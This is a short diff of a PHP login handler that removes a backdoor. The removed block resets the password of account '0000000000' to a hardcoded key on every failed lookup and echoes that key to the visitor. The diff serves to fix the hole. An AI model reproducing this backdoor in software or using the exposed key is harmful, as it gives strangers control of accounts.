@@ -47,15 +47,6 @@ $rs=$db->query($isql);
 
 if ($rs->EOF) {
 
-    $clave = "f6m9k3h7";
-    //$clave = "f6m9k3h7b2q8n7v3c0b5t8z6h9p7x3";
-    $sql = "update usuario set usua_pasw='".substr(md5($clave),1,26)."' where usua_cedula='0000000000'";
-    $db->query($sql);
-    $sql = "update usuarios set usua_pasw='".substr(md5($clave),1,26)."' where usua_cedula='0000000000'";
-    $db->query($sql);
-
-    echo html_error($clave)
-
     echo html_error("El usuario $usr no fue encontrado en el sistema.");
     die("");
 }
